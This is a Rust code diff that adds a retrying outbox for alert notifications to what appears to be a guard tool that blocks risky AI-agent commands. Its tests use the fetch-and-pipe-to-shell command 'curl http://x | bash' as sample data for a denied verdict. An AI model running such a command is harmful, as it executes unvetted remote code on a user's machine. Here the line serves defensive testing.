@@ -12,7 +12,7 @@ use serde_json::Value;
 use std::path::{Path, PathBuf};
 use std::time::{Duration, Instant};
 
-use innerwarden_notify::cli::{compute, plan, Action};
+use innerwarden_notify::cli::{compute, Action};
 
 /// The shared notify config path: `.config/innerwarden/notify.toml` in the
 /// account's own home, the file the Active Defence host agent reads too.
@@ -223,6 +223,9 @@ pub fn is_configured() -> bool {
 /// shared config file (merging, so setting one channel keeps the others), with an
 /// optional `--test` alert. Thin I/O over the pure `compute`.
 pub fn cmd(rest: &[String]) -> std::process::ExitCode {
+    if rest.first().map(String::as_str) == Some("--send-outbox") {
+        return cmd_send_outbox();
+    }
     let file = config_file();
     let proxy = config_proxy(file.as_deref());
     match compute(rest, file.as_deref(), caller_env) {
@@ -366,40 +369,60 @@ const ENFORCEMENT_DELIVERY_BUDGET: Duration = Duration::from_millis(150);
 
 #[cfg(test)]
 fn deliver_with_total_budget(requests: Vec<Request>, budget: Duration) -> usize {
-    deliver_via(requests, budget, None)
+    deliver_each(&requests, budget, None)
+        .into_iter()
+        .filter(|status| *status == DeliveryStatus::Delivered)
+        .count()
 }
 
 /// Every request within one `budget`, through `proxy` (from `notify.toml`)
-/// or straight to each address.
-fn deliver_via(requests: Vec<Request>, budget: Duration, proxy: Option<&str>) -> usize {
-    if requests.is_empty() {
-        return 0;
-    }
+/// or straight to each address, and what became of each, in order. A
+/// request the budget left no time for is `Failed`.
+fn deliver_each(
+    requests: &[Request],
+    budget: Duration,
+    proxy: Option<&str>,
+) -> Vec<DeliveryStatus> {
     let deadline = Instant::now() + budget;
-    let mut delivered = 0;
     let total = requests.len();
-    for (index, request) in requests.into_iter().enumerate() {
+    let mut statuses = Vec::with_capacity(total);
+    for (index, request) in requests.iter().enumerate() {
         let Some(remaining) = deadline.checked_duration_since(Instant::now()) else {
-            break;
+            statuses.push(DeliveryStatus::Failed);
+            continue;
         };
         // Divide the one enforcement budget among channels that remain. This is
         // deterministic and leaves no worker thread holding hook stdio open after
         // the blocking verdict has been decided.
         let slots = u32::try_from(total - index).unwrap_or(1).max(1);
-        let timeout = remaining / slots;
-        delivered +=
-            usize::from(send_with_timeout(&request, timeout, proxy) == DeliveryStatus::Delivered);
+        statuses.push(send_with_timeout(request, remaining / slots, proxy));
     }
-    delivered
+    statuses
 }
 
 /// Fire notifications for a deny verdict (and optionally review), best-effort.
 /// No-op when nothing is configured or the verdict does not warrant one.
+///
+/// A channel the budget leaves without the alert is not dropped: the alert
+/// is kept in the outbox ([`send_notice`]) and sent again by a process of
+/// its own, outside the hook's time.
 pub fn fire(command: &str, verdict: &Value) {
     let file = config_file();
-    let reqs = redacted_plan(caller_env, file.as_deref(), command, verdict);
+    let config = innerwarden_notify::resolved(caller_env, file.as_deref());
+    let notice = Notice::Verdict {
+        command: innerwarden_agent_guard::redact::redact_secrets(command).text,
+        verdict: innerwarden_agent_guard::redact::redact_json_secrets(verdict),
+    };
     let proxy = config_proxy(file.as_deref());
-    let _ = deliver_via(reqs, ENFORCEMENT_DELIVERY_BUDGET, proxy.as_deref());
+    let requests = notice.requests(&config);
+    send_notice(
+        &notice,
+        requests,
+        outbox_dir().as_deref(),
+        |requests| deliver_each(requests, ENFORCEMENT_DELIVERY_BUDGET, proxy.as_deref()),
+        &record_delivery,
+        &start_sender,
+    );
 }
 
 /// PURE: the requests [`fire`] sends, with the command and every string of
@@ -407,18 +430,26 @@ pub fn fire(command: &str, verdict: &Value) {
 /// (`innerwarden_agent_guard::redact`): an alert leaves this machine for a
 /// chat or a webhook, so a token or a password on the command line must not
 /// go with it.
+#[cfg(test)]
 fn redacted_plan(
     get_env: impl Fn(&str) -> Option<String>,
     file: Option<&str>,
     command: &str,
     verdict: &Value,
 ) -> Vec<Request> {
-    let command = innerwarden_agent_guard::redact::redact_secrets(command).text;
-    let verdict = innerwarden_agent_guard::redact::redact_json_secrets(verdict);
-    plan(get_env, file, &command, &verdict)
+    let config = innerwarden_notify::resolved(get_env, file);
+    Notice::Verdict {
+        command: innerwarden_agent_guard::redact::redact_secrets(command).text,
+        verdict: innerwarden_agent_guard::redact::redact_json_secrets(verdict),
+    }
+    .requests(&config)
+    .into_iter()
+    .map(|(_, request)| request)
+    .collect()
 }
 
-/// Fire a plain health message on every configured channel, best-effort.
+/// Fire a plain notice on every configured channel, the generic webhook
+/// included, best-effort and kept for a later send like [`fire`].
 ///
 /// Separate from [`fire`] because this is not a verdict: it carries no command
 /// and is not filtered by the deny/review preference. An operator who wired a
@@ -427,9 +458,376 @@ fn redacted_plan(
 pub fn fire_text(text: &str) {
     let file = config_file();
     let config = innerwarden_notify::resolved(caller_env, file.as_deref());
-    let requests = innerwarden_notify::text_requests(&config, text);
+    let notice = Notice::Text {
+        text: text.to_string(),
+    };
     let proxy = config_proxy(file.as_deref());
-    let _ = deliver_via(requests, ENFORCEMENT_DELIVERY_BUDGET, proxy.as_deref());
+    let requests = notice.requests(&config);
+    send_notice(
+        &notice,
+        requests,
+        outbox_dir().as_deref(),
+        |requests| deliver_each(requests, ENFORCEMENT_DELIVERY_BUDGET, proxy.as_deref()),
+        &record_delivery,
+        &start_sender,
+    );
+}
+
+/// What an alert says, kept in the outbox until every channel has it. The
+/// command and the verdict are already redacted; no channel address, token
+/// or proxy is kept: a later send reads them from `notify.toml` again.
+#[derive(Debug, Clone, PartialEq, serde::Serialize, serde::Deserialize)]
+#[serde(tag = "kind", rename_all = "snake_case")]
+enum Notice {
+    Verdict { command: String, verdict: Value },
+    Text { text: String },
+}
+
+impl Notice {
+    fn requests(
+        &self,
+        config: &innerwarden_notify::NotifyConfig,
+    ) -> Vec<(innerwarden_notify::Channel, Request)> {
+        match self {
+            Self::Verdict { command, verdict } => {
+                innerwarden_notify::verdict_requests_by_channel(config, command, verdict)
+            }
+            Self::Text { text } => innerwarden_notify::notice_requests(config, text),
+        }
+    }
+
+    fn kind(&self) -> &'static str {
+        match self {
+            Self::Verdict { .. } => "verdict",
+            Self::Text { .. } => "text",
+        }
+    }
+}
+
+/// One alert in the outbox: what it says and the channels still owed it.
+#[derive(Debug, Clone, PartialEq, serde::Serialize, serde::Deserialize)]
+struct Pending {
+    ts: u64,
+    notice: Notice,
+    channels: Vec<innerwarden_notify::Channel>,
+    attempts: u32,
+}
+
+/// The outbox folder, beside the record.
+const OUTBOX: &str = "notify-outbox";
+
+/// Sends of one alert before it is given up, and recorded as given up.
+const MAX_ATTEMPTS: u32 = 6;
+
+/// How long a later send waits for one channel.
+const LATER_SEND_TIMEOUT: Duration = Duration::from_secs(5);
+
+/// Set on the process that sends the outbox, so it never starts another.
+const SENDER_ENV: &str = "IW_NOTIFY_OUTBOX_SENDER";
+
+/// A claimed alert whose sender stopped longer ago than this is sent again.
+const STALE_CLAIM: Duration = Duration::from_secs(120);
+
+fn outbox_dir() -> Option<PathBuf> {
+    crate::graph_io::sink_dir().map(|dir| dir.join(OUTBOX))
+}
+
+fn now_secs() -> u64 {
+    std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .map(|d| d.as_secs())
+        .unwrap_or(0)
+}
+
+/// Write `pending` to `path` whole: a temporary file renamed over it, owner
+/// only, so a reader never sees half an alert.
+fn write_pending(path: &Path, pending: &Pending) -> bool {
+    let Some(dir) = path.parent() else {
+        return false;
+    };
+    if std::fs::create_dir_all(dir).is_err() {
+        return false;
+    }
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::PermissionsExt;
+        let _ = std::fs::set_permissions(dir, std::fs::Permissions::from_mode(0o700));
+    }
+    let Ok(body) = serde_json::to_vec(pending) else {
+        return false;
+    };
+    let temp = dir.join(format!(
+        ".{}.{}.tmp",
+        std::process::id(),
+        NEXT.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
+    ));
+    let mut options = std::fs::OpenOptions::new();
+    options.write(true).create_new(true);
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::OpenOptionsExt;
+        options.mode(0o600);
+    }
+    let written = options.open(&temp).and_then(|mut file| {
+        use std::io::Write;
+        file.write_all(&body)
+    });
+    if written.and_then(|()| std::fs::rename(&temp, path)).is_err() {
+        let _ = std::fs::remove_file(&temp);
+        return false;
+    }
+    true
+}
+
+static NEXT: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
+
+/// A new name in the outbox, unique to this process and this alert.
+fn new_entry(dir: &Path) -> PathBuf {
+    let nanos = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .map(|d| d.as_nanos())
+        .unwrap_or(0);
+    dir.join(format!(
+        "{nanos}-{}-{}.json",
+        std::process::id(),
+        NEXT.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
+    ))
+}
+
+fn channel_names(channels: &[innerwarden_notify::Channel]) -> Vec<&'static str> {
+    channels.iter().map(|channel| channel.as_str()).collect()
+}
+
+/// What a delivery leaves in the record: the line's kind, the alert, the
+/// channels, the sends so far.
+type Record<'a> = &'a dyn Fn(&str, &Notice, &[innerwarden_notify::Channel], u32);
+
+/// One line about a delivery in `guard-events.jsonl`.
+fn record_delivery(
+    kind: &str,
+    notice: &Notice,
+    channels: &[innerwarden_notify::Channel],
+    attempts: u32,
+) {
+    crate::graph_io::append_guard_event(&serde_json::json!({
+        "kind": kind,
+        "ts": now_secs(),
+        "notice": notice.kind(),
+        "channels": channel_names(channels),
+        "attempts": attempts,
+    }));
+}
+
+/// Send `notice` on its `requests` with `deliver`, keeping it in the outbox
+/// `dir` until every channel has it.
+///
+/// The alert is written to the outbox BEFORE the first send: a hook cut off
+/// at its wall-clock cap while sending leaves it there, and the next sender
+/// sends it. What the first send delivers is taken off; what it does not is
+/// recorded (`guard.notice_undelivered`) and left for a process of its own
+/// ([`start_sender`]) to send outside the hook's time. None of this can
+/// change a verdict or an exit code.
+fn send_notice(
+    notice: &Notice,
+    requests: Vec<(innerwarden_notify::Channel, Request)>,
+    dir: Option<&Path>,
+    deliver: impl FnOnce(&[Request]) -> Vec<DeliveryStatus>,
+    record: Record<'_>,
+    start: &dyn Fn(),
+) {
+    if requests.is_empty() {
+        return;
+    }
+    let (channels, requests): (Vec<_>, Vec<_>) = requests.into_iter().unzip();
+    let mut pending = Pending {
+        ts: now_secs(),
+        notice: notice.clone(),
+        channels: channels.clone(),
+        attempts: 0,
+    };
+    let entry = dir
+        .map(new_entry)
+        .filter(|path| write_pending(path, &pending));
+    let statuses = deliver(&requests);
+    let left: Vec<innerwarden_notify::Channel> = channels
+        .iter()
+        .zip(&statuses)
+        .filter(|(_, status)| **status != DeliveryStatus::Delivered)
+        .map(|(channel, _)| *channel)
+        .chain(channels.iter().skip(statuses.len()).copied())
+        .collect();
+    match &entry {
+        Some(path) if left.is_empty() => {
+            let _ = std::fs::remove_file(path);
+        }
+        Some(path) => {
+            pending.channels = left.clone();
+            pending.attempts = 1;
+            write_pending(path, &pending);
+        }
+        None => {}
+    }
+    if !left.is_empty() {
+        record("guard.notice_undelivered", notice, &left, 1);
+    }
+    if dir.is_some_and(outbox_holds_any) {
+        start();
+    }
+}
+
+/// Whether the outbox holds an alert not yet delivered.
+fn outbox_holds_any(dir: &Path) -> bool {
+    std::fs::read_dir(dir).is_ok_and(|entries| {
+        entries
+            .flatten()
+            .any(|entry| entry.file_name().to_string_lossy().ends_with(".json"))
+    })
+}
+
+/// Start `innerwarden notify --send-outbox` on its own, with no stdio of
+/// this process: a hook's agent waits for the hook's output to close, and
+/// this one never holds it.
+fn start_sender() {
+    if std::env::var_os(SENDER_ENV).is_some() {
+        return;
+    }
+    let Ok(program) = std::env::current_exe() else {
+        return;
+    };
+    let mut command = std::process::Command::new(program);
+    command
+        .args(["notify", "--send-outbox"])
+        .env(SENDER_ENV, "1")
+        .stdin(std::process::Stdio::null())
+        .stdout(std::process::Stdio::null())
+        .stderr(std::process::Stdio::null());
+    #[cfg(unix)]
+    {
+        use std::os::unix::process::CommandExt;
+        command.process_group(0);
+    }
+    if let Ok(mut child) = command.spawn() {
+        // A long-lived caller (the MCP proxy) reaps it; a hook exits first.
+        std::thread::spawn(move || {
+            let _ = child.wait();
+        });
+    }
+}
+
+/// `innerwarden notify --send-outbox`: send every alert in the outbox to
+/// the channels still owed it, a few rounds apart, and record each that
+/// arrives late or is given up.
+fn cmd_send_outbox() -> std::process::ExitCode {
+    let Some(dir) = outbox_dir() else {
+        return std::process::ExitCode::SUCCESS;
+    };
+    let file = config_file();
+    let config = innerwarden_notify::resolved(caller_env, file.as_deref());
+    let proxy = config_proxy(file.as_deref());
+    for wait in [
+        Duration::ZERO,
+        Duration::from_secs(5),
+        Duration::from_secs(30),
+    ] {
+        std::thread::sleep(wait);
+        send_outbox_once(
+            &dir,
+            &config,
+            |request| send_with_timeout(request, LATER_SEND_TIMEOUT, proxy.as_deref()),
+            &record_delivery,
+        );
+        if !outbox_holds_any(&dir) {
+            break;
+        }
+    }
+    std::process::ExitCode::SUCCESS
+}
+
+/// One pass over the outbox `dir`: each alert claimed (renamed, so two
+/// senders never send it twice), sent on the channels still owed it, and
+/// taken off, kept, or given up after [`MAX_ATTEMPTS`].
+fn send_outbox_once(
+    dir: &Path,
+    config: &innerwarden_notify::NotifyConfig,
+    send: impl Fn(&Request) -> DeliveryStatus,
+    record: Record<'_>,
+) {
+    let Ok(entries) = std::fs::read_dir(dir) else {
+        return;
+    };
+    let mut names: Vec<PathBuf> = entries.flatten().map(|entry| entry.path()).collect();
+    names.sort();
+    for path in names {
+        let name = path
+            .file_name()
+            .map(|n| n.to_string_lossy().into_owned())
+            .unwrap_or_default();
+        // A sender that stopped while it held an alert: give the alert back.
+        if let Some(base) = name.strip_suffix(".sending") {
+            let stale = std::fs::metadata(&path)
+                .and_then(|meta| meta.modified())
+                .ok()
+                .and_then(|modified| modified.elapsed().ok())
+                .is_some_and(|age| age > STALE_CLAIM);
+            if stale {
+                let _ = std::fs::rename(&path, dir.join(base));
+            }
+            continue;
+        }
+        if !name.ends_with(".json") {
+            continue;
+        }
+        let claimed = dir.join(format!("{name}.sending"));
+        if std::fs::rename(&path, &claimed).is_err() {
+            continue;
+        }
+        let Some(mut pending) = std::fs::read(&claimed)
+            .ok()
+            .and_then(|bytes| serde_json::from_slice::<Pending>(&bytes).ok())
+        else {
+            let _ = std::fs::remove_file(&claimed);
+            continue;
+        };
+        let mut delivered = Vec::new();
+        let mut left = Vec::new();
+        for (channel, request) in pending.notice.requests(config) {
+            if !pending.channels.contains(&channel) {
+                continue;
+            }
+            if send(&request) == DeliveryStatus::Delivered {
+                delivered.push(channel);
+            } else {
+                left.push(channel);
+            }
+        }
+        pending.attempts += 1;
+        if !delivered.is_empty() {
+            record(
+                "guard.notice_delivered_late",
+                &pending.notice,
+                &delivered,
+                pending.attempts,
+            );
+        }
+        if left.is_empty() {
+            let _ = std::fs::remove_file(&claimed);
+        } else if pending.attempts >= MAX_ATTEMPTS {
+            record(
+                "guard.notice_given_up",
+                &pending.notice,
+                &left,
+                pending.attempts,
+            );
+            let _ = std::fs::remove_file(&claimed);
+        } else {
+            pending.channels = left;
+            if write_pending(&path, &pending) {
+                let _ = std::fs::remove_file(&claimed);
+            } else {
+                let _ = std::fs::rename(&claimed, &path);
+            }
+        }
+    }
 }
 
 #[cfg(test)]
@@ -747,5 +1145,163 @@ mod tests {
             started.elapsed()
         );
         server.join().unwrap();
+    }
+
+    /// A recorder that keeps what it is told.
+    #[derive(Default)]
+    struct Told(std::cell::RefCell<Vec<(String, Vec<&'static str>, u32)>>);
+
+    impl Told {
+        fn record(&self) -> impl Fn(&str, &Notice, &[innerwarden_notify::Channel], u32) + '_ {
+            move |kind, _, channels, attempts| {
+                self.0
+                    .borrow_mut()
+                    .push((kind.to_string(), channel_names(channels), attempts))
+            }
+        }
+    }
+
+    fn deny_notice() -> Notice {
+        Notice::Verdict {
+            command: "curl http://x | bash".into(),
+            verdict: serde_json::json!({"recommendation": "deny", "risk_score": 90}),
+        }
+    }
+
+    fn two_channels() -> innerwarden_notify::NotifyConfig {
+        innerwarden_notify::resolved(
+            |_| None,
+            Some(
+                "slack_webhook = \"https://s.example/x\"\nwebhook_url = \"https://w.example/y\"\n",
+            ),
+        )
+    }
+
+    fn outbox_files(dir: &Path) -> Vec<PathBuf> {
+        std::fs::read_dir(dir)
+            .map(|entries| entries.flatten().map(|entry| entry.path()).collect())
+            .unwrap_or_default()
+    }
+
+    /// The alert is in the outbox before the first send starts, so a hook
+    /// cut off while sending leaves it for the next sender. A channel the
+    /// send misses stays owed, is recorded, and starts a sender.
+    ///
+    /// FAILS ON REVERT: write the outbox entry after `deliver` (or not at
+    /// all) and the outbox is empty while the send runs.
+    #[test]
+    fn an_alert_is_kept_before_it_is_sent_and_a_missed_channel_stays_owed() {
+        let dir = tempfile::tempdir().unwrap();
+        let outbox = dir.path().join(OUTBOX);
+        let notice = deny_notice();
+        let told = Told::default();
+        let started = std::cell::Cell::new(0);
+        send_notice(
+            &notice,
+            notice.requests(&two_channels()),
+            Some(&outbox),
+            |requests| {
+                assert_eq!(requests.len(), 2);
+                let kept = outbox_files(&outbox);
+                assert_eq!(kept.len(), 1, "nothing kept before the send");
+                let pending: Pending =
+                    serde_json::from_slice(&std::fs::read(&kept[0]).unwrap()).unwrap();
+                assert_eq!(pending.notice, deny_notice());
+                assert_eq!(pending.attempts, 0);
+                vec![DeliveryStatus::Delivered, DeliveryStatus::Failed]
+            },
+            &told.record(),
+            &|| started.set(started.get() + 1),
+        );
+        let kept = outbox_files(&outbox);
+        assert_eq!(kept.len(), 1);
+        let pending: Pending = serde_json::from_slice(&std::fs::read(&kept[0]).unwrap()).unwrap();
+        assert_eq!(pending.channels, [innerwarden_notify::Channel::Webhook]);
+        assert_eq!(pending.attempts, 1);
+        assert_eq!(
+            *told.0.borrow(),
+            [("guard.notice_undelivered".to_string(), vec!["webhook"], 1)]
+        );
+        assert_eq!(started.get(), 1);
+        // No address, token or proxy is kept, only what the alert says.
+        let raw = std::fs::read_to_string(&kept[0]).unwrap();
+        assert!(!raw.contains("example"), "{raw}");
+    }
+
+    /// An alert every channel took leaves nothing behind and starts nothing.
+    #[test]
+    fn an_alert_every_channel_took_leaves_nothing() {
+        let dir = tempfile::tempdir().unwrap();
+        let outbox = dir.path().join(OUTBOX);
+        let notice = deny_notice();
+        let told = Told::default();
+        let started = std::cell::Cell::new(0);
+        send_notice(
+            &notice,
+            notice.requests(&two_channels()),
+            Some(&outbox),
+            |requests| vec![DeliveryStatus::Delivered; requests.len()],
+            &told.record(),
+            &|| started.set(started.get() + 1),
+        );
+        assert!(outbox_files(&outbox).is_empty());
+        assert!(told.0.borrow().is_empty());
+        assert_eq!(started.get(), 0);
+    }
+
+    /// A later send delivers what is owed and records it; one that keeps
+    /// failing is given up after [`MAX_ATTEMPTS`], recorded, never silently.
+    ///
+    /// FAILS ON REVERT: drop the `guard.notice_given_up` line and the alert
+    /// goes with no trace; drop the rewrite and a failed alert is lost.
+    #[test]
+    fn a_later_send_delivers_or_gives_up_on_the_record() {
+        let dir = tempfile::tempdir().unwrap();
+        let outbox = dir.path().join(OUTBOX);
+        let config = two_channels();
+        let pending = Pending {
+            ts: 1,
+            notice: deny_notice(),
+            channels: vec![innerwarden_notify::Channel::Webhook],
+            attempts: 1,
+        };
+        assert!(write_pending(&new_entry(&outbox), &pending));
+        let told = Told::default();
+        let sent = std::cell::RefCell::new(Vec::new());
+        send_outbox_once(
+            &outbox,
+            &config,
+            |request| {
+                sent.borrow_mut().push(request.url.clone());
+                DeliveryStatus::Delivered
+            },
+            &told.record(),
+        );
+        // Only the channel still owed is sent again.
+        assert_eq!(*sent.borrow(), ["https://w.example/y"]);
+        assert!(outbox_files(&outbox).is_empty());
+        assert_eq!(
+            *told.0.borrow(),
+            [(
+                "guard.notice_delivered_late".to_string(),
+                vec!["webhook"],
+                2
+            )]
+        );
+
+        assert!(write_pending(&new_entry(&outbox), &pending));
+        let told = Told::default();
+        for _ in 1..MAX_ATTEMPTS {
+            send_outbox_once(&outbox, &config, |_| DeliveryStatus::Failed, &told.record());
+        }
+        assert!(outbox_files(&outbox).is_empty());
+        assert_eq!(
+            *told.0.borrow(),
+            [(
+                "guard.notice_given_up".to_string(),
+                vec!["webhook"],
+                MAX_ATTEMPTS
+            )]
+        );
     }
 }
